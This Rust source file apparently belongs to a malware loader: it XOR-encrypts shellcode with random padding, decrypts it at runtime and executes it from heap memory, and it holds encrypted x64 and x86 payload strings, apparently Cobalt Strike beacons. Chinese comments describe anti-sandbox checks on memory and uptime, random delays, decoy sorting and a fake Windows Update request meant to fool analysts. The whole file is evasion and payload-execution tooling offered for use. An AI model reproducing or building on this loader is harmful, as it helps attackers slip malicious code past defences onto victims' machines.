use crate::toolbox::sleep::random_sleep;
use crate::loader::heapapi_healdlloc::heapapi_healdlloc_execute_shellcode;
use crate::encryption::rc4::*;
use crate::toolbox::sandbox_check::sandbox_check_memory;
use crate::toolbox::sandbox_check::sandbox_check_uptime;
use crate::toolbox::bubble_sort::bubble_sort;
use crate::toolbox::midnight_maze::midnight_maze;
use crate::toolbox::request_check::request_check;
use crate::encryption::xor_random::{add_random, rm_random, xor_decrypt, xor_encrypt};

fn str_to_u8array(str : &str) -> Vec<u8> {

    let hex_string = str.replace("\\x", "");
    let bytes = hex::decode(hex_string).unwrap();
    let result = bytes.as_slice();
    // println!("{:?}", result);
    result.to_vec()
}

fn encryption(shellcode:&[u8],key: &str){

    let encrypted =xor_encrypt(shellcode,key.as_bytes());
    // println!("\n{}", encrypted0);

    let random_string = add_random(encrypted.as_str(), key);
    println!("xor_encrypted_random_string:\n{}", random_string);
}

fn decryption(random_string:&str,key:&str)-> Vec<u8>{

    let encrypted = rm_random(random_string);
    // println!("\n{:?}", encrypted);

    let shellcode = xor_decrypt(encrypted.as_slice(),key.as_bytes());
    // println!("shellcode:{:?}", shellcode);
    shellcode
}

fn run_config(){
    // 迷惑行为 @1 冒泡排序 参数为参与的冒泡数量
    bubble_sort(10);

    // 午夜迷宫 @1 仅在特定小时特定分钟可用 参数分别为小时、分钟
    // midnight_maze(13,49);

    // 迷惑行为 @2 模拟请求，此处模拟windows系统更新
    // request_check("http://windowsupdate.microsoft.com");

    // 反沙箱模块 @1 内存检测 参数为最小内存要求
    sandbox_check_memory(3);

    // 反沙箱模块 @2 开机时间检测 参数为最小开机时间要求，单位为分钟
    sandbox_check_uptime(10);

    // 反沙箱模块 @3 随机延时 两个参数分别为最小值最大值
    random_sleep(1,2);
}

fn cs_run(random_string:&str,key:&str){
    let encrypted = rm_random(random_string);
    // println!("{:?}", encrypted);

    let shellcode = xor_decrypt(encrypted.as_slice(),key.as_bytes());
    println!("shellcode:{:?}", shellcode);
}


pub(crate) fn planb_create(key:&str,shellcode:&[u8]) {
    // let key = "GjGKKyYUF778V5Vhvvhjhsd798GCKnx";
    // let shellcode = &[0xfc,0x48];
    print!("shellcode:\n{:?}\n",shellcode);
    encryption(shellcode,key);
}

pub(crate) fn planb_run(key:&str,xor_encrypted_random_string:&str) {
    // let key = "GjGKKyYUF778V5Vhvvhjhsd798GCKnx";

    // run_config();

    // let xor_encrypted_random_string="6247626a3247324b";
    // x64
    // let xor_encrypted_random_string ="6247626a3247324b634b34796159665562466237393731383956313535563568347636763368376a37683673366439373139373836473543304b346e33783947326a3047334b654b35793959625538463037643733386256653566563668357635763968376a30686373636431373139353833473243364b666e33783147356a3447614b304b66796359305533463937323739383156313535566168667631763768646a37686473376435373639373866476343314b656e35783947626a3647644b614b35793459305562463137343737383156343538563168377637763868666a39683873656434376539303861473643664b626e39786147356a3847374b314b35793059615531466137333731386456323530563768367636766268636a37683573306434373139653833473443384b366e30786547666a3747304b654b37793059365531463637613730383656313536566268637662763968626a30683473376434373339343862473243364b666e64783847376a3147654b324b30793059335534466137613739383056393564566568307665763268666a37683373626433373139363831473543314b666e36783947616a3647394b354b33796559325532463937373762386156323535566268637630766468626a30683073666434373239393864473243334b346e39783847656a3247324b374b36793859625565463737333738383956383539566368347662763768366a33683673666439373639653864473543324b336e39783947336a6147374b354b32793459345565463637303733383656353564566568367634766368656a30683173666430373739633830473243654b356e63783047656a3647624b394b37793259645530466137663732383556353531566468307632766268636a37683773326434373139663833473443384b366e32783947666a6447374b324b65793059325532463637393761383356323535563668667637763868366a30683173396431376139313831473243664b326e30783047366a3347334b304b36793159315530463337663761386256353537563568307637763668356a63683873646438373039653837473443304b666e33783247336a6547664b644b37796159385533463237373738386356393562566368387636763468356a32683473376430376139663835473143394b316e31783247396a3047334b324b39793259655533466637373739383156383530563368307666766268656a64683173376434376439663863473443314b376e64783247336a6147304b314b34796559365564463937373761383656323563563068367666763068376a30683773366439373139303836473543664b626e38783047616a3547624b384b65793059615531466237333738383056393531563468667663763068646a36683173346431376639313863476143384b336e38783347306a3547324b634b32793059655533466137393733383256643563563168377664763568336a38683473376430376539373861476143374b336e39783147366a3247624b314b36793259315534463837333738383056383531563468667663763668306a62686573616437373939303863476143384b336e38783347326a6647324b644b32793059655533466137393733386256353535566568357637763068626a31683973666430376539373861476143374b326e61783247666a3647614b344b35793059625563466637323762383056623531563468667663766468636a36683273316436373639643863476143384b336e32783047666a6647624b304b32793059655539466137623732383356303565563368647636763668376a30686373656462373239303833476543374b616e32783047656a6147644b384b37796259345562463437383736386156363531563868377637766668656a36683573366461373139373838476643374b626e36786547366a6547304b644b39793759625566466537643762383356363562566268327661763468336a39683473376434373339303833473943314b626e37783447386a6547654b634b62793459615534466237373739386256323538563668617666766468336a33683673336438373539363864476443664b346e39783747386a3947384b394b34793759335538463137383731383056363534563168617664766268656a36683173396462376439623863476543314b326e63786347376a6247614b364b63793259615538463637623765386656633534563968307661763668666a35683973626464373439663838476243624b396e35786647636a6247354b654b66793959385539466637303730383356333538566668667639763968656a62686373306437376639393835473143334b376e39783047326a3447644b634b65793859305538466437613737383156313535566268387639763468646a66683973656462376639323838473543644b366e34786547316a6547664b644b61793959635566463337393736383756633533566168647630766568636a66686573616466373339323834476343614b646e61783247336a3447354b644b61796459655534466237333738383356613533563668327633763468376a34683373306432373739363831476643374b396e34783247376a6247374b634b33796459315539463037643730383156343539563768367635766568356a64683273396433373739373831473443654b336e35783247386a3147304b324b65793259375532463737313738383756363536563068367638763068376a31683773316430373039313835476343334b386e30786347316a3947304b314b31796259345561463237363732383756343534563068317631763768306a39683673656436373339303861473143654b306e38783247626a3047664b314b30793259655532463937333732383356303532563168367639763068326a30683473306466373739383830473643364b306e34783847356a6547334b644b32793059335565463237353733386656343538563168377635763568356a31683273636432373639363862473243394b316e64783247346a3047314b324b38793659325534463637373733383556393531566168647664766468626a34683373646437373939343863473043324b316e37783347386a3847654b314b33796259665534463737623761386356333539563168667665766368636a31683773396461376439353864473143634b336e62786647646a3347334b374b35796459665565463137653766383256343539563568327664763068386a63683773366431376339383839473443624b396e65783347376a6247364b374b35796259345562466337373734383456653566566568637631763868316a38683873306461373739643863473143624b316e34783347386a6447364b644b64796659615564466337323765383656343566566568317664766168336a65683273326430376439393839476143304b646e31786547336a3547314b644b35793459345535466637383739383556353563563868377662763668646a38686473396439376439633865473043304b646e32783347616a3247314b354b65793659375564463437363737386456323537566368357665766468396a39683673396433373839623832476543614b646e38783347616a3147334b384b39796159385563463937613735386656363530563868317665766168356a62683873346436376639363837476443314b396e32786547666a3047374b394b30796459355565463537353739383756653537563768647666766568636a33686273306434376539393864473143384b376e61783247396a6247654b344b62793359325530463937323762383056613539566168617661763668316a30683973646461376539363836473443634b666e37783647396a3447304b314b34796359375561463037363731386356393565563868627631763968386a66683873636461376539663831473443344b326e36783647326a6247364b664b38796659345531466337633761386256383535566468657639763468366a37686673616432373239303836473143324b656e63786547346a6547664b374b34793959325538466137373764386256363561563668387666763868336a65683573646463376139643865473943364b396e32786547306a3047304b314b66793859335534466137653732386256373533566668397638766168386a63686673306465373539353839473643654b336e39786647396a3947614b664b32796559395531466437383736383856633531566468377637766668656a38686473336438373539363837473543354b366e32783947636a6547374b364b37793859365561463637383733383256643564563768377633763968336a38683473376430373239663831473343364b646e63783147346a3847664b624b38793959655530463337653761383056613530563668307665766268656a64683073376430376439663863473443314b656e65783147616a6347334b374b64793059365561463437383737383356363534563768657662763068636a31683073366466373939353839476643384b666e31786147356a3947354b394b32793059335563463837623764383756393564563068387636763468336a38683173356465376439643833473243314b656e36783947626a3547664b334b61793859315566466237663732386256333563563668667637763168336a64683473376434373339343862473643654b326e38783847346a3847324b644b38796259365562463437383736383656383536563468377631763168396a30683273306438373739383830473443364b316e35783047356a3847344b374b35793159355564463637383734383956623561563568667638763868";
    // X86
    // let xor_encrypted_random_string ="6247626a3847324b634b65793459625534466237373739383356393564566368617633763068366a65683573356463376439643836473743364b366e65783347326a3447374b614b65793359335538463737633766383856313536563168667633763668386a66683073646436373539373861473943314b346e39783847376a6347364b374b62793259615533463737373762383756353537563568387637766668386a33686173336439373939313864473743614b366e33786147326a3147664b644b33796159375561466537333733383156353538563368367665763968626a33683073376433376239633865476143654b306e63783047646a3647624b394b37793159625563463037333731383456313564566568317665763168376a33683673656462376239353830473943314b666e65783347346a3247664b644b36793959625563463537393738386356353535566668377639763568666a39683873386434376539343861476143394b346e30786147376a3147664b624b33793459385533463637383731383656323532563868367632763468326a64683573366430376439643836476443374b326e36783947616a3547314b304b65793359365536463237333766383856333563563268627633763868656a62686373636434373739633830473643664b616e38786347656a3247654b364b33793659665531463037323732383356383530566368317663763668366a63683873646438373039653836476143304b636e65783347366a3447394b644b65796559335537463037303731386456303531563468337633763968356a30683373306432376139323835473043374b326e63783247666a3247364b334b30793659645534466337383736383856633536563468627639763668306a36683073366466373039313836473243334b656e35783247326a3047304b664b63796659395535466237643739386156653530563368377633763968336a38683173636437373239383832473343664b326e39783247646a3647394b314b36793159615532463337353739386256353535563568347636763668346a36683773356430373039313862476343634b396e61786547386a3947614b334b38793359315561463337333734383256623536563668357635763168336a38683473356430373339633866473343634b326e61783147356a3347394b314b35793159625532463337393732383056633537566268377664766368386a65683273626431373939303862473643394b356e33783847346a3747384b394b33796659335564463037323738386356333537563668317635763168316a35683473316435376239333830473943314b616e64786347326a6147614b344b38796359665538463837373738383556393535563568377637766368386a62683273636465373239323833473143644b666e39783147396a6447374b664b30793059635530466137643739383156333539566368387665766368626a31683873366432376239303865473443664b326e36783747366a3947354b394b32793759615562463437323765383356333535563268317637763668316a36683773356430376539313836473243624b366e36783347386a3947614b334b64793759365561463437373737383356363534563068657666766568346a63686673306437373239623834473843374b656e39783447366a3647614b344b37796159325538463237373738383556393535563568617665766268636a63683873636437376139393831476143324b346e31783847316a3547374b364b33796559395532463237613731386456663562563668337634763168376a34683273386438373339363833473643394b306e64786347316a3047664b624b30793559655534466537363734383956653537563068337637763568626a35686273376466373739323861473743664b386e62783947616a3247314b394b30796259625536463737663737383656383538563068397666763068346a37683973356465373839303835473443324b326e61786247346a3147314b364b33793859325536463137623763386256663533566668657666763868386a62683973366436373539643866473143644b366e64783547636a6647304b314b36793959365530466337363737383356383531563668377632763768356a62686673336436373739363864473343624b376e38783047366a3047394b324b34793259655533466237303764383656333537563568367663763168386a31686473336435373539633836473043324b356e30786447306a3447354b624b32793959305564463037643731386456313530563068647631763968376a35683273386433373939323832473043324b316e34783247366a3447354b374b32793659355537466237353739383756313530563268327666763568396a35683373356437373239313834473643374b366e32783647326a3247354b364b35796559345534463537393735386156343534563768367634763968346a38683273626432373639313863473043624b316e61783047636a3047334b334b33793659345537466537343761383656653537566268377635763068316a31683773316430373139643837476443304b326e32783547336a6147354b614b34793859305536463037313731383856303531563168377637766568356a64683273346432373839323834473443374b376e35783447646a3647614b354b34793559355539463737653764383256373562566668347666763968356a33686573336466373239363837473143354b626e33786347346a3547654b394b36796459345563463137393731386156653533563768357634763368396a62686173666436373239613830473543314b346e38783447646a6247624b654b31796659305536463237323731386256363562566468327638763568306a37683973666436373939313839473943314b616e63783147316a3947664b304b31796359305533463637383730383956633535563168357665763168626a37683873376437373139363832473143374b656e39783847356a6547304b354b31796659655534463337663766383856373530563368387636766468336a33683273626430376339313865473843344b626e30786647646a3547364b634b65793459665564466237313761383056313534566468317637763968386a33686573306431373139633836473343654b396e39783247626a6247384b634b61793559335531463737653763383256633532563568387634763068656a33686373386432373139373861476443354b366e39783847626a6147304b634b30796659375530466337353734386356383565566468647636766568346a33686573616464373539613837473843344b316e61783847376a6247334b614b66793559385565463037613736386656363537566668667665763368646a65686673656435373739373837476643374b306e32783647396a3447344b324b62793259305539466637383733386456343537563168627662763268346a36683373326437373039303866476443304b396e34786147616a6647384b314b33796659665534463837353734383156663564563068357637763568326a39683573396463376539663865473543624b366e66783747316a3747364b314b38793559655533466437333734383056313531566268327632766668396a36686273346432376639663838476143614b326e37783947336a6247324b644b64793059315538463237643735383856393564563168627630763168346a62683473306432373239363862476243634b616e33786347346a3347384b624b61793159615534466137383765383556623530566168367633763968356a30686273376466373639653839473343384b386e37783947326a3047304b304b37793259335534466237363739383556393535563568327665763368376a33683773376438373539363836473243334b656e33783047646a3247324b354b38796459395535466237643765383056643564563368377633763968336a38683473376434373239393832473343664b326e62786347656a3847644b314b30793259335534466237353739383556393535563568317635763668316a35686673326461376339303862476343624b346e39783747616a3347664b334b61793859315565466137653766383856363533563368367666766168626a64683873376433373639613865473343364b626e62786147666a6347334b624b61796259345562463437343738383656383536563268367638763068326a30683773316436373639373830473243364b656e34783647346a3747344b664b357966593655614635373237613864563035635638683676";

    let shellcode=decryption(xor_encrypted_random_string,key);
    heapapi_healdlloc_execute_shellcode(shellcode);
}
